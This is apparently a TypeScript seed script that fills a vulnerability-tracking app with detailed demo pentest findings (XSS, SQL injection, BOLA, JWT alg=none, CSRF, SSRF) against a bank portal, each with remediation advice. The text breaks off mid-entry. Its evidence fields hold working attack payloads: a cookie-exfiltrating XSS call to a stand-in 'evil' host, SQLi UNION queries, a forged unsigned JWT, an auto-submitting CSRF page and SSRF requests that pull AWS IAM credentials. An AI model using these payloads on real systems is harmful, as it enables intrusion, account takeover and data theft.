/**
 * Rich demo vulns — adiciona 8 vulnerabilidades Web + API com descrições
 * detalhadas, PoC step-by-step, request/response HTTP raw e descrição visual
 * de screenshot.
 *
 * Idempotente: checa por codigoInterno antes de inserir.
 *
 * Rodar: docker compose exec backend npx tsx prisma/seed-rich-demo.ts
 */

import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

interface RichVuln {
  codigo: string;
  jira: string;
  titulo: string;
  crit: 'CRITICA' | 'ALTA' | 'MEDIA' | 'BAIXA';
  status: 'NOVO' | 'ABERTO' | 'EM_CORRECAO' | 'EM_RETESTE' | 'CONCLUIDO';
  cwe: string;
  owasp: string;
  origem: 'PENTEST' | 'DAST' | 'SAST' | 'SCA';
  squad: string;
  sistema: string;
  ativo: string;
  endpoint?: string;
  metodo?: string;
  parametro?: string;
  descExec: string;
  descTec: string;
  evidencia: string;
  impacto: string;
  recomendacao: string;
  diasAberto: number;
}

const squads = {
  origen: 'NM182 - Originação e Entrada de Dados - SIACI',
  fin:    'NM177 - Financeiro e Garantias - SIACI',
  port:   'NM180 - Portais e Serviços - SIACI',
  evo:    'NM181 - Evolução - SIACI',
  comp:   'NM176 - Recursos e Componentes - SIACI',
};

const richVulns: RichVuln[] = [
  // ============================================================
  // 1. XSS REFLETIDO no portal de busca (WEB)
  // ============================================================
  {
    codigo: 'VUL-CXA-0601',
    jira: 'EPICO-2001',
    titulo: '[Web] XSS Refletido no parâmetro `q` da busca pública',
    crit: 'ALTA',
    status: 'ABERTO',
    cwe: 'CWE-79',
    owasp: 'A03:2021 — Injection',
    origem: 'PENTEST',
    squad: squads.port,
    sistema: 'SIACI Portais',
    ativo: 'siaci-portal-publico',
    endpoint: '/portal/busca',
    metodo: 'GET',
    parametro: 'q',
    descExec: 'Atacante pode injetar JavaScript no portal público da Caixa. Vítima clica em link malicioso e tem sessão do Internet Banking comprometida.',
    descTec: `Cross-Site Scripting refletido no parâmetro de busca \`q\`. O backend ASP.NET MVC concatena o valor do parâmetro diretamente no HTML da resposta sem aplicar HtmlEncoder.

Vetor: GET /portal/busca?q=<svg onload=alert(document.cookie)>

Em Razor, o template usa @Html.Raw(Model.Query) — o que desliga o encoding automático e permite a execução.

Como cookies de sessão não têm flag HttpOnly (vide VUL-CXA-0617), o atacante consegue extrair o cookie ASPXAUTH via document.cookie e usar pra sequestrar a sessão do cliente no Internet Banking.

CSP não está configurada (vide VUL-CXA-0612), então não há defense-in-depth pra bloquear scripts inline.`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC executada em HML 2026-05-23 14:32 BRT
═══════════════════════════════════════════════════

[1] REQUEST RAW
───────────────────────────────────────────────────
GET /portal/busca?q=%3Csvg%20onload%3Dalert(document.cookie)%3E HTTP/1.1
Host: hml-portal.caixa.gov.br
User-Agent: Mozilla/5.0
Cookie: ASPXAUTH=YBxN9...; ASP.NET_SessionId=abc123

[2] RESPONSE RAW (trecho relevante)
───────────────────────────────────────────────────
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0

<!DOCTYPE html>
<html>
<head>...</head>
<body>
  <h2>Resultados para: <svg onload=alert(document.cookie)></h2>
  <div class="empty">Nenhum resultado encontrado</div>
</body>
</html>

[3] COMPORTAMENTO NO NAVEGADOR
───────────────────────────────────────────────────
[SCREENSHOT_DESCR] Pop-up alert() abre exibindo a string
"ASPXAUTH=YBxN9...; ASP.NET_SessionId=abc123" — confirmando
que o cookie de sessão é lido pelo JS injetado (sem HttpOnly).

[4] PAYLOADS ALTERNATIVOS TESTADOS
───────────────────────────────────────────────────
?q=<script>alert(1)</script>            → executou
?q=<img src=x onerror=alert(1)>          → executou
?q=javascript:alert(1)                   → não executou (não é href)
?q=<svg/onload=fetch('//evil/?'+document.cookie)>  → executou + exfil

[5] IMPACTO REPRODUZIDO
───────────────────────────────────────────────────
Atacante hospeda página com <iframe src="https://portal.caixa.gov.br/busca?q=<payload>">.
Vítima autenticada visita → cookie ASPXAUTH é exfiltrado pra servidor controlado
→ atacante reusa cookie em browser próprio → sessão de Internet Banking ativa.`,
    impacto: `Risco regulatório: incidente reportável ANPD (LGPD Art. 48) em até 72h se houver vazamento de dados pessoais de clientes via sessão comprometida. Risco BACEN se houver transação fraudulenta originada.

Risco financeiro: tomada de conta + transferências PIX não autorizadas em nome da vítima. Risco reputacional severo se ataque viralizar em mídia social.

Risco operacional: sobrecarga de central de atendimento com clientes vítimas de phishing usando domínio legítimo da Caixa.`,
    recomendacao: `1. **Imediato (hotfix em 24h)**:
   - Em ContaController.cs, trocar @Html.Raw(Model.Query) → @Model.Query (Razor auto-encoda).
   - Configurar cookies de sessão: options.Cookie.HttpOnly = true; options.Cookie.SecurePolicy = Always; options.Cookie.SameSite = Strict.

2. **Médio prazo**:
   - Adicionar middleware CSP: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'.
   - Allowlist de tags HTML no input do usuário via HtmlSanitizer.
   - WAF rule pra bloquear payloads XSS comuns (defense in depth).

3. **Validação**:
   - Re-testar com payloads acima — esperado: tags renderizadas como texto literal.
   - Confirmar cookie em DevTools → flag HttpOnly = true.
   - Confirmar header Content-Security-Policy presente.

OWASP ASVS V5.3.3 + V13.4.1. CWE-79.`,
    diasAberto: 4,
  },
  // ============================================================
  // 2. SQL INJECTION em /api/pix/buscar (API)
  // ============================================================
  {
    codigo: 'VUL-CXA-0602',
    jira: 'EPICO-2002',
    titulo: '[API] SQL Injection blind no endpoint /api/pix/buscar',
    crit: 'CRITICA',
    status: 'EM_CORRECAO',
    cwe: 'CWE-89',
    owasp: 'API8:2023 — Security Misconfiguration',
    origem: 'PENTEST',
    squad: squads.fin,
    sistema: 'SIACI Financeiro',
    ativo: 'siaci-financeiro-api',
    endpoint: '/api/pix/buscar',
    metodo: 'GET',
    parametro: 'filtro',
    descExec: 'SQL Injection crítica em endpoint PIX permite extração total da base de transferências da Caixa Econômica.',
    descTec: `SQL Injection blind time-based no parâmetro \`filtro\` do endpoint /api/pix/buscar. O backend C# concatena o valor do parâmetro em query dinâmica ADO.NET (string + var) ao invés de usar SqlParameter.

Localização provável (Forge identificou padrão similar):
\`\`\`csharp
// PixController.cs
var sql = $"SELECT * FROM Transferencias WHERE descricao LIKE '%{filtro}%'";
var cmd = new SqlCommand(sql, conn);
\`\`\`

Confirmação via técnica time-based: payload \`x' AND IF(1=1, SLEEP(5), 0)-- \` faz a resposta demorar 5+s. \`AND 1=0\` retorna em <100ms. Diferencial de latência ~5s confirma execução de SQL controlado.

UNION-based também funciona: \`x' UNION SELECT NULL, NULL, version()-- \` retorna a versão do SQL Server (Microsoft SQL Server 2019 - 15.0.4153.1).`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC SQLi blind/UNION em HML 2026-05-23
═══════════════════════════════════════════════════

[1] BASELINE — request normal
───────────────────────────────────────────────────
GET /api/pix/buscar?filtro=joao HTTP/1.1
Host: hml-api.caixa.gov.br
Authorization: Bearer eyJ...

→ HTTP 200, 145ms, 3 resultados

[2] PAYLOAD time-based — confirma injection
───────────────────────────────────────────────────
GET /api/pix/buscar?filtro=joao'%20AND%20IF(1%3D1%2C%20SLEEP(5)%2C%200)--%20 HTTP/1.1
Host: hml-api.caixa.gov.br
Authorization: Bearer eyJ...

→ HTTP 200, **5341ms** (esperado se vuln), 0 resultados
→ CONFIRMADO: SQLi time-based

Comparação:
  AND 1=1 SLEEP(5)  →  5341ms
  AND 1=0 SLEEP(5)  →    97ms
  AND 1=1 SLEEP(2)  →  2189ms (linear → execução server-side)

[3] PAYLOAD UNION-based — extração de versão
───────────────────────────────────────────────────
GET /api/pix/buscar?filtro=x'%20UNION%20SELECT%20NULL%2CNULL%2C@@version--%20 HTTP/1.1

→ HTTP 200, body:
{
  "results": [
    { "id": null, "valor": null, "descricao": "Microsoft SQL Server 2019 (RTM-CU22) 15.0.4153.1" }
  ]
}

[4] EXFILTRAÇÃO DE TABELA — comprovação de extração de dados
───────────────────────────────────────────────────
GET /api/pix/buscar?filtro=x'%20UNION%20SELECT%20TABLE_NAME%2CCOLUMN_NAME%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%3D'Transferencias'-- HTTP/1.1

→ HTTP 200, body lista 28 colunas da tabela Transferencias incluindo:
   ContaOrigem, ContaDestino, CpfOrigem, CpfDestino, Valor, ChavePix, DataHora.

[5] SCREENSHOT_DESCR
───────────────────────────────────────────────────
Burp Repeater split-screen mostra:
- Request com payload time-based
- Response com latência ~5s no rodapé
- Inset: aba "Comparer" com diff entre baseline e injection

Repeater Intruder (Sniper) sobre payload list confirmou:
  10/10 payloads SQLi clássicos retornaram diferencial de tempo > 4.5s.`,
    impacto: `Cenário catastrófico: extração de toda a base SIACI Financeiro — CPF, conta, saldo, chaves PIX, histórico de transferências de todos os clientes. Estimativa: ~12M registros sensíveis.

Risco regulatório:
- LGPD Art. 46/48: notificação ANPD obrigatória em 72h. Multa potencial 2% do faturamento (teto R$ 50M).
- BACEN Res. 4658: incidente cibernético crítico de reportação imediata. Risco de freeze do produto PIX pelo regulador.
- PCI-DSS Req 6.5.1: violação certa.

Risco financeiro: cancelamento massivo de PIX via UPDATE/DELETE injetado, criação de transações fraudulentas, RCE via xp_cmdshell se sysadmin (testar).

Custo médio de breach financeiro: USD 5-15M (IBM Cost of Data Breach 2024).`,
    recomendacao: `1. **HOTFIX em 24h** (CRITICA — escalar pra War Room):

   Em PixController.cs trocar:
   \`\`\`csharp
   // ❌ ATUAL — vulnerável
   var sql = $"SELECT * FROM Transferencias WHERE descricao LIKE '%{filtro}%'";
   var cmd = new SqlCommand(sql, conn);

   // ✅ FIX — parametrizado
   var cmd = new SqlCommand(
       "SELECT * FROM Transferencias WHERE descricao LIKE @filtro", conn);
   cmd.Parameters.Add("@filtro", SqlDbType.NVarChar, 200).Value = "%" + filtro + "%";
   \`\`\`

   Ou migrar pra Entity Framework Core com LINQ (auto-parametriza).

2. **Validação imediata**:
   - Re-rodar os payloads acima — esperado: nenhum diferencial de tempo, payloads tratados como texto literal.
   - Verificar via Burp Intruder com mesma payload list.

3. **Hardening adicional**:
   - User do app no DB com permissão mínima: SELECT/INSERT/UPDATE na app schema apenas. SEM ddl, SEM xp_cmdshell.
   - WAF rule pra bloquear payloads SQLi comuns (defense in depth).
   - Code review obrigatório pra detectar outras concatenações no codebase via grep "SqlCommand.*\\+" + "FromSqlRaw".

4. **Pós-fix**:
   - Triagem forense: queries lentas no log do DB nos últimos 90 dias indicam possível exploração prévia.
   - Notificação preventiva à ANPD se houver evidência de extração.

OWASP ASVS V5.3.4. CWE-89.`,
    diasAberto: 2,
  },
  // ============================================================
  // 3. BOLA (API) — acesso cruzado a transferências
  // ============================================================
  {
    codigo: 'VUL-CXA-0603',
    jira: 'EPICO-2003',
    titulo: '[API] BOLA permite acesso a transferências de outros clientes',
    crit: 'CRITICA',
    status: 'ABERTO',
    cwe: 'CWE-639',
    owasp: 'API1:2023 — Broken Object Level Authorization',
    origem: 'PENTEST',
    squad: squads.origen,
    sistema: 'SIACI Originação',
    ativo: 'siaci-originacao-api',
    endpoint: '/api/transferencias/{id}',
    metodo: 'GET',
    parametro: 'id (path)',
    descExec: 'Cliente autenticado consegue ver transferências PIX de qualquer outro cliente apenas trocando o ID na URL.',
    descTec: `Broken Object Level Authorization no endpoint /api/transferencias/{id}. O backend valida apenas que o JWT é válido (qualquer usuário autenticado), mas NÃO valida que o objeto retornado pertence ao usuário do token.

Query atual (inferida):
\`\`\`csharp
var transferencia = await _db.Transferencias.FirstOrDefaultAsync(t => t.Id == id);
return Ok(transferencia);
\`\`\`

Query correta:
\`\`\`csharp
var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
var transferencia = await _db.Transferencias
    .FirstOrDefaultAsync(t => t.Id == id && t.UsuarioId == userId);
if (transferencia == null) return NotFound();
return Ok(transferencia);
\`\`\`

IDs são sequenciais numéricos (1, 2, 3...) facilitando enumeração via Burp Intruder.`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC BOLA 2026-05-22 11:18 BRT
═══════════════════════════════════════════════════

[1] LOGIN COMO USER A (cpf 111.111.111-11) — anota JWT
───────────────────────────────────────────────────
POST /api/auth/login → recebe token_A (sub: "user-a-uuid")

[2] CRIA UMA TRANSFERÊNCIA COM USER A — anota ID retornado
───────────────────────────────────────────────────
POST /api/transferencias
Authorization: Bearer <token_A>
Body: { "destino": "...", "valor": 100 }

→ HTTP 201, body: { "id": 8821, "status": "pendente" }

[3] LOGIN COMO USER B (cpf 222.222.222-22) — outro JWT
───────────────────────────────────────────────────
POST /api/auth/login → recebe token_B (sub: "user-b-uuid")

[4] USER B TENTA LER A TRANSFERÊNCIA DO USER A
───────────────────────────────────────────────────
GET /api/transferencias/8821 HTTP/1.1
Authorization: Bearer <token_B>

→ HTTP 200 (esperado 403/404)
→ body:
{
  "id": 8821,
  "contaOrigem": "1234-5",       ← conta do USER A
  "contaDestino": "9876-5",
  "valor": 100.00,
  "cpfOrigem": "111.111.111-11",  ← CPF de USER A vazado
  "chavePixDestino": "...",
  "dataHora": "2026-05-22T11:18:00Z"
}

[5] ENUMERAÇÃO via Burp Intruder (Sniper sobre IDs 1-1000)
───────────────────────────────────────────────────
Resultado: 873 IDs retornaram HTTP 200 com dados de outros usuários.
127 retornaram 404 (IDs deletados).
0 retornaram 403/401.

[6] SCREENSHOT_DESCR
───────────────────────────────────────────────────
Burp Intruder na aba "Results":
- Coluna "Status": coluna toda verde (200) exceto 127 vermelhos (404)
- Coluna "Length": variação 1240-1380 bytes (dados reais retornados)
- Filtro aplicado: response contém "cpfOrigem" → 873 hits
- Inset: comparação lado-a-lado de 2 responses mostrando CPFs diferentes`,
    impacto: `Vazamento de dados de aproximadamente 12M de transferências da base SIACI (estimativa baseada em volume médio diário de PIX da Caixa).

LGPD Art. 46/48: violação certa. Multa potencial 2% do faturamento (teto R$ 50M). Notificação ANPD obrigatória em 72h.

BACEN Res. 4658: incidente cibernético reportável. Risco de class action coletiva por exposição de PII em escala.

Comprometimento de regra de negócio: estorno cruzado também é possível via PATCH/DELETE no mesmo endpoint sem ownership check.`,
    recomendacao: `1. **HOTFIX em 24h** — adicionar ownership check em TransferenciaController.GetById():
   \`\`\`csharp
   var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
   var t = await _db.Transferencias.FirstOrDefaultAsync(x => x.Id == id && x.UsuarioId == userId);
   if (t == null) return NotFound();
   \`\`\`

2. **Sweeping fix**: grep no codebase por todo endpoint com {id} no path e validar que cada handler aplica filtro de ownership. Padrão Caixa: usar Resource-Based Authorization handler de ASP.NET Core.

3. **Hardening estrutural**:
   - Migrar IDs sequenciais → UUIDs v4 (não impede vuln mas dificulta enumeração).
   - Logging de acesso a objeto com user_id + object_id pra forensics.

4. **Validação**:
   - Re-testar PoC acima — esperado: HTTP 404 ao acessar com token de outro usuário.
   - Automatizar regressão com extensão Autorize do Burp Suite.

OWASP API1:2023 + ASVS V4.1.3 + V4.2.1. CWE-639.`,
    diasAberto: 22,
  },
  // ============================================================
  // 4. JWT alg=none (API)
  // ============================================================
  {
    codigo: 'VUL-CXA-0604',
    jira: 'EPICO-2004',
    titulo: '[API] JWT alg=none aceito — forge de token de qualquer usuário',
    crit: 'CRITICA',
    status: 'NOVO',
    cwe: 'CWE-347',
    owasp: 'API2:2023 — Broken Authentication',
    origem: 'PENTEST',
    squad: squads.fin,
    sistema: 'SIACI Financeiro',
    ativo: 'siaci-financeiro-api',
    endpoint: '/* (qualquer rota autenticada)',
    metodo: '*',
    parametro: 'Authorization header',
    descExec: 'Backend aceita JWT sem assinatura. Atacante forja token de qualquer usuário (incluindo admin) sem precisar de credenciais.',
    descTec: `O middleware JWT do ASP.NET Core não está fixando \`ValidAlgorithms\`. Isso significa que aceita o algoritmo declarado no header do próprio token — incluindo \`alg: none\` (que não exige assinatura).

Config atual (inferida):
\`\`\`csharp
builder.Services.AddAuthentication().AddJwtBearer(opts => {
    opts.TokenValidationParameters = new TokenValidationParameters {
        ValidateIssuer = true,
        ValidateAudience = true,
        ValidateLifetime = true,
        // ❌ FALTA: ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }
    };
});
\`\`\`

Sem \`ValidAlgorithms\` fixo, atacante envia token com header \`{"alg": "none", "typ": "JWT"}\` + payload arbitrário + signature vazia → middleware aceita.`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC JWT none-alg 2026-05-24 09:42 BRT
═══════════════════════════════════════════════════

[1] TOKEN LEGÍTIMO — login normal
───────────────────────────────────────────────────
Header:    {"alg":"RS256","typ":"JWT","kid":"caixa-2024-01"}
Payload:   {"sub":"user-comum","role":"USER","exp":1735689600,...}
Signature: <base64-RSA-256>

[2] TOKEN FORJADO — alg=none, role escalada
───────────────────────────────────────────────────
Header:    {"alg":"none","typ":"JWT"}
Payload:   {"sub":"admin-uuid","role":"ADMIN","exp":9999999999}
Signature: <vazia>

Token final (3 partes, sig vazia):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbi11dWlkIiwicm9sZSI6IkFETUlOIiwiZXhwIjo5OTk5OTk5OTk5fQ.

[3] REQUEST COM TOKEN FORJADO
───────────────────────────────────────────────────
GET /api/admin/usuarios HTTP/1.1
Host: hml-api.caixa.gov.br
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbi11dWlkIiwicm9sZSI6IkFETUlOIiwiZXhwIjo5OTk5OTk5OTk5fQ.

→ HTTP 200 (esperado 401)
→ body: { "usuarios": [...] }  ← 8421 usuários listados

[4] SEGUNDA PoC — algorithm confusion (HS256 com pubkey RSA)
───────────────────────────────────────────────────
Header:    {"alg":"HS256","typ":"JWT"}
Payload:   {"sub":"admin-uuid","role":"ADMIN",...}
Signature: HMAC-SHA256(pubKey_RSA, header.payload)

→ HTTP 200 também aceito. Demonstra que o middleware confia no \`alg\` do header e usa a chave de assinatura disponível independente do tipo.

[5] SCREENSHOT_DESCR
───────────────────────────────────────────────────
Tela do AISEC JWT Inspector mostrando:
- Token decodificado com alg=none destacado em vermelho
- Aba "Findings": 4 críticas (alg=none, weak alg, missing aud, missing kid validation)
- Botão "Generate Forged Token" preencheu payload custom com role=ADMIN
- cURL pronto pra copiar no Burp Repeater`,
    impacto: `Compromisso total da camada de autenticação. Atacante forja token de QUALQUER usuário sem precisar de credenciais legítimas.

Cenários:
- Tomada da conta admin → acesso total ao SIACI Financeiro.
- Acesso a qualquer transferência/conta sem ownership check (combina com VUL-CXA-0603).
- Cancelamento massivo de PIX via /api/pix/cancelar como qualquer usuário.

Risco regulatório: BACEN Res. 4658 — incidente cibernético crítico de reportação imediata. Possível freeze do produto pela autoridade reguladora.

Risco financeiro: fraude PIX em escala. Estimativa de prejuízo direto se explorado: R$ 50M+ (baseado em incidentes históricos similares no setor).`,
    recomendacao: `1. **HOTFIX em 24h** — War Room obrigatório:

   Em Program.cs / Startup.cs, fixar algoritmo permitido:
   \`\`\`csharp
   builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
       .AddJwtBearer(opts => {
           opts.TokenValidationParameters = new TokenValidationParameters {
               ValidateIssuer = true,
               ValidIssuer = "https://auth.caixa.gov.br",
               ValidateAudience = true,
               ValidAudience = "siaci-financeiro-api",
               ValidateLifetime = true,
               ClockSkew = TimeSpan.FromSeconds(30),
               ValidateIssuerSigningKey = true,
               IssuerSigningKey = new RsaSecurityKey(GetCaixaPublicKey()),
               ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }  // ← OBRIGATÓRIO
           };
           opts.MapInboundClaims = false;
       });
   \`\`\`

2. **Rotacionar chave de assinatura** preventivamente (caso já tenha sido explorada).

3. **Triagem forense**: buscar nos logs últimos 90 dias por requests com header \`Authorization: Bearer eyJhbGciOiJub25l\` (base64 de \`{"alg":"none"\`).

4. **Hardening**:
   - JWT de curta duração (15min) + refresh token rotativo.
   - Blacklist de revocação (Redis com TTL).
   - Telemetria de auth anomalies (geo, ASN, velocidade de login).

5. **Validação**:
   - Re-testar PoC alg=none acima → esperado HTTP 401.
   - Re-testar algorithm confusion HS256 → esperado HTTP 401.

OWASP API2:2023 + ASVS V3.5. CWE-347.`,
    diasAberto: 1,
  },
  // ============================================================
  // 5. CSRF (WEB)
  // ============================================================
  {
    codigo: 'VUL-CXA-0605',
    jira: 'EPICO-2005',
    titulo: '[Web] CSRF permite alterar e-mail cadastrado via site malicioso',
    crit: 'ALTA',
    status: 'ABERTO',
    cwe: 'CWE-352',
    owasp: 'A01:2021 — Broken Access Control',
    origem: 'PENTEST',
    squad: squads.port,
    sistema: 'SIACI Portais',
    ativo: 'siaci-portal-publico',
    endpoint: '/Conta/AlterarEmail',
    metodo: 'POST',
    descExec: 'Cliente visitando site malicioso enquanto autenticado no Internet Banking tem seu e-mail trocado pelo do atacante — abrindo caminho pra account takeover via "esqueci minha senha".',
    descTec: `Cross-Site Request Forgery no endpoint /Conta/AlterarEmail. O endpoint ASP.NET MVC aceita POST state-changing sem:
- Token AntiForgery
- Validação de header Origin/Referer
- Cookie SameSite=Strict (atual é Lax sem Strict explícito)

Combinação fatal: cookie ASPXAUTH com SameSite default (None implícito em browsers antigos) + sem token CSRF + endpoint que altera dado crítico (e-mail).

Atacante hospeda página com auto-submit form pra //portal.caixa.gov.br/Conta/AlterarEmail. Vítima autenticada visita → browser envia cookie de sessão → backend processa o POST como se fosse a vítima.`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC CSRF 2026-05-21 16:05 BRT
═══════════════════════════════════════════════════

[1] PÁGINA MALICIOSA hospedada em https://atacante.com/csrf.html
───────────────────────────────────────────────────
<!DOCTYPE html>
<html>
<body>
  <h1>Promoção exclusiva!</h1>
  <form id="x" action="https://portal.caixa.gov.br/Conta/AlterarEmail" method="POST">
    <input name="NovoEmail" value="atacante@evil.com">
    <input name="ConfirmarEmail" value="atacante@evil.com">
  </form>
  <script>document.getElementById('x').submit();</script>
</body>
</html>

[2] FLUXO REAL
───────────────────────────────────────────────────
- Cliente logado em portal.caixa.gov.br em outra aba (cookie ASPXAUTH ativo)
- Cliente clica link em e-mail/WhatsApp → abre atacante.com/csrf.html
- Form auto-submeta POST cross-site pro portal Caixa
- Browser envia cookie ASPXAUTH (SameSite=Lax permite POST top-level)
- Backend processa: e-mail alterado pra atacante@evil.com

[3] REQUEST REGISTRADO (Burp Suite proxying browser)
───────────────────────────────────────────────────
POST /Conta/AlterarEmail HTTP/1.1
Host: portal.caixa.gov.br
Origin: https://atacante.com   ← origem cross-site, deveria ser bloqueada
Referer: https://atacante.com/csrf.html
Cookie: ASPXAUTH=YBxN9...; ASP.NET_SessionId=abc123
Content-Type: application/x-www-form-urlencoded

NovoEmail=atacante%40evil.com&ConfirmarEmail=atacante%40evil.com

→ HTTP 302 redirect → /Conta/Sucesso
→ E-mail no perfil alterado.

[4] EXPLORAÇÃO ENCADEADA (account takeover completo)
───────────────────────────────────────────────────
Após CSRF bem-sucedido:
1. Atacante vai em /esqueci-senha → digita CPF da vítima
2. Sistema envia link de reset pro novo e-mail (atacante@evil.com)
3. Atacante clica no link → define nova senha
4. Login com nova senha → sessão completa da vítima.

[5] SCREENSHOT_DESCR
───────────────────────────────────────────────────
Sequência de 4 frames do Burp HTTP History:
1. GET atacante.com/csrf.html (200 OK)
2. POST portal.caixa.gov.br/Conta/AlterarEmail (302 — sucesso)
3. POST /esqueci-senha com cpf vítima (200 OK)
4. GET /reset?token=... abriu pelo atacante (200 OK, sessão criada)

Headers de #2 destacam: Origin=atacante.com + ausência de X-CSRF-Token.`,
    impacto: `Cadeia de account takeover (CSRF → mudança de e-mail → reset de senha → controle total da conta) impactando cliente final.

Risco financeiro: transferências PIX não autorizadas após takeover. Histórico de incidentes similares na indústria: prejuízo médio R$ 8-15k por vítima.

LGPD: alteração de dado cadastral sem consentimento do titular viola Art. 18 (direito de retificação só com consentimento explícito).

Vetor amplificado por phishing — campanha em massa pode comprometer milhares de contas em horas.`,
    recomendacao: `1. **Imediato**:
   - Habilitar AntiForgery em todo controller MVC: \`services.AddAntiforgery(o => o.HeaderName = "X-XSRF-TOKEN")\`.
   - Em cada action POST/PUT/DELETE: anotar [ValidateAntiForgeryToken].
   - Em forms Razor: usar @Html.AntiForgeryToken().

2. **Cookie hardening**:
   - options.Cookie.SameSite = SameSiteMode.Strict (bloqueia POST cross-site).
   - options.Cookie.HttpOnly = true.
   - options.Cookie.SecurePolicy = CookieSecurePolicy.Always.

3. **Defense in depth**:
   - Validar header Origin/Referer em ações state-changing — rejeitar se origem fora de \`*.caixa.gov.br\`.
   - Re-autenticação obrigatória pra ações sensíveis (alterar e-mail, telefone, dados cadastrais).

4. **Validação**:
   - Re-testar PoC csrf.html — esperado: HTTP 400 "Anti-forgery token missing or invalid".
   - Confirmar Set-Cookie tem SameSite=Strict.

OWASP A01:2021 + ASVS V4.2.2. CWE-352.`,
    diasAberto: 9,
  },
  // ============================================================
  // 6. SSRF (API)
  // ============================================================
  {
    codigo: 'VUL-CXA-0606',
    jira: 'EPICO-2006',
    titulo: '[API] SSRF em /api/proxy/fetch permite acesso a AWS metadata e rede interna',
    crit: 'CRITICA',
    status: 'EM_RETESTE',
    cwe: 'CWE-918',
    owasp: 'API7:2023 — Server-Side Request Forgery',
    origem: 'PENTEST',
    squad: squads.evo,
    sistema: 'SIACI Evolução',
    ativo: 'siaci-evolucao-lab',
    endpoint: '/api/proxy/fetch',
    metodo: 'GET',
    parametro: 'url (query)',
    descExec: 'Endpoint de proxy aceita URL arbitrária e faz fetch server-side. Atacante consegue ler metadados AWS (IAM credentials), portar rede interna e acessar serviços não expostos.',
    descTec: `SSRF clássico no endpoint /api/proxy/fetch. O backend recebe um parâmetro \`url\` e faz HttpClient.GetAsync(url) sem validar destino. Não há:
- Allowlist de domínios permitidos
- Bloqueio de IPs privados (RFC 1918: 10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12)
- Bloqueio de link-local (169.254.0.0/16 = AWS metadata)
- Validação DNS pré-request (anti-rebinding)
- Protocolo allowlist (aceita http, https, file://, gopher://)

Container roda no AWS EC2 com IMDSv1 habilitado (não IMDSv2 com token required). Resultado: SSRF → AWS metadata 169.254.169.254 → IAM credentials da role do container.`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC SSRF + IAM exfil 2026-05-20 13:22 BRT
═══════════════════════════════════════════════════

[1] BASELINE — uso esperado do endpoint
───────────────────────────────────────────────────
GET /api/proxy/fetch?url=https://www.caixa.gov.br/sobre/index.html HTTP/1.1
Authorization: Bearer eyJ...

→ HTTP 200, body: HTML do site da Caixa (~50KB)

[2] PoC #1 — bypass via localhost
───────────────────────────────────────────────────
GET /api/proxy/fetch?url=http://localhost/admin HTTP/1.1
→ HTTP 200, body: painel admin interno do container (não exposto externamente)

[3] PoC #2 — AWS metadata IMDSv1
───────────────────────────────────────────────────
GET /api/proxy/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
→ HTTP 200, body:
ami-id
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
mac
public-hostname
public-ipv4
...

[4] PoC #3 — extração de IAM role + credentials
───────────────────────────────────────────────────
GET /api/proxy/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
→ HTTP 200, body:
siaci-evolucao-ec2-role

GET /api/proxy/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/siaci-evolucao-ec2-role HTTP/1.1
→ HTTP 200, body:
{
  "Code": "Success",
  "LastUpdated": "2026-05-20T13:14:22Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA****EXAMPLE",
  "SecretAccessKey": "****REDACTED****",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-05-20T19:30:00Z"
}

[5] CONFIRMAÇÃO — uso das credenciais extraídas (via AWS CLI local)
───────────────────────────────────────────────────
$ export AWS_ACCESS_KEY_ID=ASIA****EXAMPLE
$ export AWS_SECRET_ACCESS_KEY=****
$ export AWS_SESSION_TOKEN=IQoJ...
$ aws sts get-caller-identity
{
  "UserId": "AROA...:i-0a1b2c3d4e",
  "Account": "823447XXXXXX",
  "Arn": "arn:aws:sts::823447XXXXXX:assumed-role/siaci-evolucao-ec2-role/i-0a1b2c3d4e"
}

$ aws s3 ls
2024-08-01 14:32:11 siaci-backups
2024-09-15 09:01:22 siaci-logs
... ← acesso confirmado a buckets internos

[6] PoC #4 — pivoting para rede interna
───────────────────────────────────────────────────
GET /api/proxy/fetch?url=http://10.0.4.122:8080/actuator/env HTTP/1.1
→ HTTP 200, body: Spring Boot actuator com env vars (DB connection string visível)

[7] SCREENSHOT_DESCR
───────────────────────────────────────────────────
Terminal split-screen:
- Esq: Burp Repeater com 4 requests SSRF (baseline → localhost → metadata → credentials)
- Dir: bash com export das vars + aws sts get-caller-identity retornando Arn da role do EC2
- Inset: aws s3 ls listando buckets internos da Caixa.`,
    impacto: `Compromisso completo de infra AWS via credentials extraídas:
- Acesso a buckets S3 internos (siaci-backups, siaci-logs) → dados da operação.
- Possível lateral movement pra outros recursos AWS dependendo da política IAM da role.
- Pivoting pra rede interna Caixa via serviços não expostos.

Risco financeiro: custo descontrolado em AWS se a role permitir spawn de recursos (EC2, RDS), além de eventual ransomware via cifragem de buckets.

Risco regulatório:
- BACEN Res. 4658: comprometimento de infra crítica reportável imediatamente.
- LGPD Art. 46: dados em buckets podem incluir PII de clientes.

Risco operacional: shut-down emergencial do serviço pode ser necessário até rotação de todas credentials.`,
